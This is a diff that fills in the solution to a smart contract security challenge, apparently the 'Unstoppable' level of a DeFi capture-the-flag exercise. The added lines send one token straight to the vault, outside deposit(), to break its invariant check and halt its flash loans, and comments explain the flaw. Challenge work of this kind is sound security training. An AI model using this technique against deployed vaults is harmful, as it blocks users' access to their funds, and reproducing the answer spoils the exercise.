@@ -91,7 +91,11 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // The bug: vault compares convertToShares(totalSupply) with actual token balance.
+        // If we send tokens directly to the vault (bypassing deposit()),
+        // the balance increases but totalSupply stays the same.
+        // This breaks the flash loan invariant check.
+        token.transfer(address(vault), 1);
     }
 
     /**
